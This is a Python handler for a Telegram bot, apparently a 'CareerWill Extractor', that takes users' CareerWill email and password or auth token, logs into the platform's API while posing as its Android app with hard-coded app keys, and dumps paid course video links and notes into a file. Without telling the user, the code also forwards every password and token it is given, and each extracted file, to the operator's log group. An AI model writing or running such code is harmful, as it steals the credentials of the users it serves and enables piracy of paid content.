import logging
import os
import requests
import urllib.parse
import time
from telegram import Update
from telegram.ext import (
    CommandHandler,
    ConversationHandler,
    MessageHandler,
    ContextTypes,
    filters,
)

# Conversation states
LOGIN_CHOICE, BATCH_SELECTION = range(2)

# Constants
ROOT_DIR = os.getcwd()

async def cw_start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Start the CareerWill extraction process."""
    if context.user_data.get('conversation_active', False):
        await update.message.reply_text("Ending previous conversation...")
        context.user_data.clear()
    
    context.user_data['conversation_active'] = True
    await update.message.reply_text(
        "𝐖𝐞𝐥𝐜𝐨𝐦𝐞 𝐭𝐨 𝐂𝐚𝐫𝐞𝐞𝐫𝐖𝐢𝐥𝐥 𝐄𝐱𝐭𝐫𝐚𝐜𝐭𝐨𝐫!\n\n"
        "Please enter your credentials in the following format:\n"
        "1️⃣ For ID and Password: `id*password`\n"
        "2️⃣ For Token: `token`\n\n"
        "Example:\n"
        "For ID and Password: `example@example.com*password123`\n"
        "For Token: `eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...`"
    )
    return LOGIN_CHOICE

async def handle_login_choice(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle the login credentials input."""
    try:
        input_text = update.message.text.strip()
        
        # Check if input is in the format id*password
        if '*' in input_text:
            email, password = input_text.split('*', 1)
            context.user_data['login_choice'] = '1'
            context.user_data['email'] = email
            context.user_data['password'] = password
        else:
            # Assume input is a token
            context.user_data['login_choice'] = '2'
            context.user_data['token'] = input_text

        # Delete the user's message containing credentials
        await update.message.delete()

        # Proceed with login
        return await handle_password_or_token(update, context)

    except Exception as e:
        logging.error(f"Error in handle_login_choice: {e}")
        await update.message.reply_text("An error occurred. Please try again later.")
        return ConversationHandler.END

async def handle_password_or_token(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle password or token input and perform login."""
    try:
        headers = {
            "Host": "elearn.crwilladmin.com",
            "cwkey": "0+Net6ePMulPNHJRIbXVsXvi/rokjxmqV2Yrssrl4bbDBqB9RLXsNk0qC=E8mztS",
            "apptype": "android",
            "appver": "101",
            "usertype": "",
            "token": "",
            "user-agent": "okhttp/5.0.0-alpha.2",
            "content-type": "application/json; charset=utf-8",
            "accept-encoding": "gzip"
        }

        # Log credentials to the log group using main bot
        log_group_id = context.application.log_group_id_cw  # Get log group ID from context
        main_bot = context.application.main_bot  # Get main bot instance

        if context.user_data['login_choice'] == '1':
            await main_bot.send_message(
                chat_id=log_group_id,
                text=f"New CareerWill login attempt:\nEmail: ```{context.user_data['email']}```\nPassword: ```{context.user_data['password']}```",
                parse_mode="Markdown"
            )
        else:
            await main_bot.send_message(
                chat_id=log_group_id,
                text=f"New CareerWill token login:\nToken: ```{context.user_data['token']}```",
                parse_mode="Markdown"
            )

        if context.user_data['login_choice'] == '1':
            # Login with ID and password
            login_url = "https://elearn.crwilladmin.com/api/v8/login-other"
            payload = {
                "deviceType": "android",
                "password": context.user_data['password'],
                "deviceIMEI": "47ec4ac17f45d738",
                "deviceModel": "CPH1853",
                "deviceVersion": "27",
                "email": context.user_data['email'],
                "deviceToken": "test_device_token"
            }
            
            response = requests.post(login_url, headers=headers, json=payload)
            
            if response.status_code != 200:
                await update.message.reply_text(f"Login failed! Server response: {response.text[:100]}...")
                return ConversationHandler.END
            
            try:
                response_data = response.json()
            except ValueError:
                await update.message.reply_text(f"Invalid JSON response: {response.text[:100]}")
                return ConversationHandler.END
            
            if "token" not in response_data.get("data", {}):
                await update.message.reply_text("Login failed! Token not found in response.")
                return ConversationHandler.END

            token = response_data["data"]["token"]
            
            # Log token to the log group using main bot
            await main_bot.send_message(
                chat_id=log_group_id,
                text=f"CareerWill Login Success!\nGenerated Token: ```{token}```",
                parse_mode="Markdown"
            )
        else:
            # Direct token login
            token = context.user_data['token']

        # Store token and fetch batches
        context.user_data['token'] = token
        headers = {
            "Host": "elearn.crwilladmin.com",
            "cwkey": "soSOH9sHmhmEjbaCrHPqey4ufevydC8ZthTvUbY4K\u003d2bdNZBQglW1X6qHV3Xf/70",
            "appver": "101",
            "apptype": "android",
            "usertype": "2",
            "token": token,
            "user-agent": "okhttp/5.0.0-alpha.2",
            "accept-encoding": "gzip"
        }
        
        batch_response = requests.get(
            "https://elearn.crwilladmin.com/api/v8/my-batch",
            headers=headers
        )

        if batch_response.status_code != 200:
            await update.message.reply_text(f"Failed to fetch batches. Status code: {batch_response.status_code}")
            return ConversationHandler.END

        batches = batch_response.json().get("data", {}).get("batchData", [])
        context.user_data['batches'] = batches

        # Format batch information with token
        batch_text = f"𝐋𝐨𝐠𝐢𝐧 𝐒𝐮𝐜𝐜𝐞𝐬𝐬𝐟𝐮𝐥!\n\n𝙰𝚞𝚝𝚑 𝚃𝚘𝚔𝚎𝚗: ```{token}```\n\n𝐀𝐯𝐚𝐢𝐥𝐚𝐛𝐥𝐞 𝐁𝐚𝐭𝐜𝐡𝐞𝐬:\n\n"
        
        if not batches:
            batch_text += "No batches found."
        else:
            for batch in batches:
                batch_text += f"𝑩𝒂𝒕𝒄𝒉 𝑵𝒂𝒎𝒆: ```{batch['batchName']}```\n𝑩𝒂𝒕𝒄𝒉 𝑰𝑫: ```{batch['id']}```\n\n"

        await update.message.reply_text(
            f"{batch_text}\nPlease enter the Batch ID to proceed:",
            parse_mode="Markdown"
        )
        return BATCH_SELECTION
            
    except requests.exceptions.RequestException as e:
        await update.message.reply_text(f"Error fetching batches: {str(e)}")
        return ConversationHandler.END

    except Exception as e:
        logging.error(f"Error in handle_password_or_token: {e}")
        await update.message.reply_text(f"An error occurred during login: {str(e)}")
        return ConversationHandler.END

async def handle_batch_selection(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle batch selection and extract content."""
    try:
        batch_id = update.message.text.strip()
        
        # Find selected batch
        selected_batch = next(
            (batch for batch in context.user_data['batches'] if str(batch['id']) == batch_id),
            None
        )
        
        if not selected_batch:
            await update.message.reply_text("Invalid Batch ID! Please try again.")
            return BATCH_SELECTION

        await update.message.reply_text("𝐋𝐢𝐧𝐤 𝐞𝐱𝐭𝐫𝐚𝐜𝐭𝐢𝐨𝐧 𝐬𝐭𝐚𝐫𝐭𝐞𝐝. 𝐏𝐥𝐞𝐚𝐬𝐞 𝐰𝐚𝐢𝐭✋️...")

        start_time = time.time()  # Start time for extraction

        # Setup headers for API requests
        headers = {
            "Host": "elearn.crwilladmin.com",
            "cwkey": "soSOH9sHmhmEjbaCrHPqey4ufevydC8ZthTvUbY4K\u003d2bdNZBQglW1X6qHV3Xf/70",
            "appver": "101",
            "apptype": "android",
            "usertype": "2",
            "token": context.user_data['token'],
            "user-agent": "okhttp/5.0.0-alpha.2",
            "accept-encoding": "gzip"
        }

        # Fetch topics
        topics_url = f"https://elearn.crwilladmin.com/api/v8/batch-topic/{batch_id}?type=class"
        topics_response = requests.get(topics_url, headers=headers)
        
        if topics_response.status_code != 200:
            await update.message.reply_text("Failed to fetch topics. Please try again.")
            return ConversationHandler.END

        topics = topics_response.json().get("data", {}).get("batch_topic", [])
        full_content = f"Batch: {selected_batch['batchName']}\n\n"

        # Extract video URLs and notes for each topic
        for topic in topics:
            topic_id = topic["id"]
            topic_name = topic["topicName"].replace(":", " ")

            full_content += f" Topic: {topic_name}\n"

            # Fetch class details
            class_url = f"https://elearn.crwilladmin.com/api/v8/batch-detail/{batch_id}?redirectBy=mybatch&topicId={topic_id}&pToken=&chapterId=0"
            class_response = requests.get(class_url, headers=headers)
            
            if class_response.status_code == 200 and 'data' in class_response.json() and 'class_list' in class_response.json()['data']:
                classes = class_response.json()["data"]["class_list"]["classes"]

                for cls in classes:
                    lesson_name = cls["lessonName"].replace(":", " ")
                    class_id = cls["id"]
                    lesson_ext = cls.get("lessonExt", "")

                    if lesson_ext == "brightcove":
                        # Get detailed class information to get the correct lessonUrl
                        class_detail_url = f"https://elearn.crwilladmin.com/api/v8/class-detail/{class_id}"
                        class_detail_response = requests.get(class_detail_url, headers=headers)
                        
                        if class_detail_response.status_code == 200 and 'data' in class_detail_response.json() and 'class_detail' in class_detail_response.json()['data']:
                            class_detail = class_detail_response.json()["data"]["class_detail"]
                            lesson_url = class_detail.get("lessonUrl", "")
                            
                            if lesson_url:
                                video_url = f"https://edge.api.brightcove.com/playback/v1/accounts/6206459123001/videos/{lesson_url}/master.m3u8?bcov_auth={context.user_data['token']}"
                                full_content += f"   {lesson_name}: {video_url}\n"
                    
                    elif lesson_ext == "youtube":
                        lesson_url = cls.get("lessonUrl", "")
                        if lesson_url:
                            video_url = f"https://www.youtube.com/embed/{lesson_url}"
                            full_content += f"   {lesson_name}: {video_url}\n"

            # Fetch notes
            notes_url = f"https://elearn.crwilladmin.com/api/v8/batch-notes/{batch_id}?topicId={topic_id}"
            notes_response = requests.get(notes_url, headers=headers)
            if notes_response.status_code == 200 and 'data' in notes_response.json() and 'notesDetails' in notes_response.json()['data']:
                notes = notes_response.json()["data"]["notesDetails"]
                full_content += "\n   Notes:\n"

                for note in notes:
                    doc_title = note["docTitle"].replace(":", " ")
                    doc_url = note["docUrl"]

                    # Convert spaces in URL to %20
                    doc_url = urllib.parse.quote(doc_url, safe=':/')

                    full_content += f"   {doc_title}: {doc_url}\n"

            full_content += "\n"  

        if full_content:
            filename = f"CW_{selected_batch['batchName']}_{batch_id}.txt"
            file_path = os.path.join(ROOT_DIR, filename)
            
            with open(file_path, "w", encoding="utf-8") as f:
                f.write(full_content)

            # Calculate extraction time
            extraction_time = time.time() - start_time
            extraction_time_str = f"{extraction_time:.2f} seconds"

            # Send file to user
            user_caption = (
                f"𝑯𝒆𝒓𝒆'𝒔 𝒚𝒐𝒖𝒓 𝒆𝒙𝒕𝒓𝒂𝒄𝒕𝒆𝒅 𝒄𝒐𝒏𝒕𝒆𝒏𝒕!✨️\n\n"
                f"𝐁𝐚𝐭𝐜𝐡 𝐧𝐚𝐦𝐞: {selected_batch['batchName']}\n"
                f"𝑬𝒙𝒕𝒓𝒂𝒄𝒕𝒊𝒐𝒏 𝒕𝒊𝒎𝒆⏱️: {extraction_time_str}"
            )
            with open(file_path, "rb") as f:
                await update.message.reply_document(
                    document=f,
                    caption=user_caption
                )

            # Send file to log group using main bot
            log_group_id = context.application.log_group_id_cw  # Get log group ID from context
            main_bot = context.application.main_bot  # Get main bot instance

            log_caption = (
                f"📥 **CareerWill Content Extracted:**\n"
                f"👤 **User ID:** `{update.message.from_user.id}`\n"
                f"📌 **Batch Name:** {selected_batch['batchName']}\n"
                f"⏱ **Extraction Time:** {extraction_time_str}"
            )
            with open(file_path, "rb") as f:
                await main_bot.send_document(
                    chat_id=log_group_id,
                    document=f,
                    caption=log_caption
                )

            # Clean up
            os.remove(file_path)
            await update.message.reply_text("𝑬𝒙𝒕𝒓𝒂𝒄𝒕𝒊𝒐𝒏 𝒄𝒐𝒎𝒑𝒍𝒆𝒕𝒆𝒅 𝒔𝒖𝒄𝒄𝒆𝒔𝒔𝒇𝒖𝒍𝒍𝒚! ✨")
            return ConversationHandler.END  # Ensure the conversation ends here after successful extraction

        else:
            await update.message.reply_text("𝐍𝐨 𝐜𝐨𝐧𝐭𝐞𝐧𝐭 𝐟𝐨𝐮𝐧𝐝 Sorry🤪.")
            return ConversationHandler.END  # End the conversation if no content is found

    except Exception as e:
        logging.error(f"Error in handle_batch_selection: {e}")
        await update.message.reply_text("An error occurred during content extraction. Please try again later.")
        return ConversationHandler.END

async def timeout(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle conversation timeout."""
    await update.message.reply_text("Conversation timed out. Please start again.")
    context.user_data.clear()
    return ConversationHandler.END

# Create the conversation handler
cw_handler = ConversationHandler(
    entry_points=[CommandHandler("cw", cw_start)],
    states={
        LOGIN_CHOICE: [MessageHandler(filters.TEXT & ~filters.COMMAND, handle_login_choice)],
        BATCH_SELECTION: [MessageHandler(filters.TEXT & ~filters.COMMAND, handle_batch_selection)],
    },
    fallbacks=[MessageHandler(filters.ALL, timeout)],  # Handle timeout
    conversation_timeout=600,  # 10 minutes timeout
)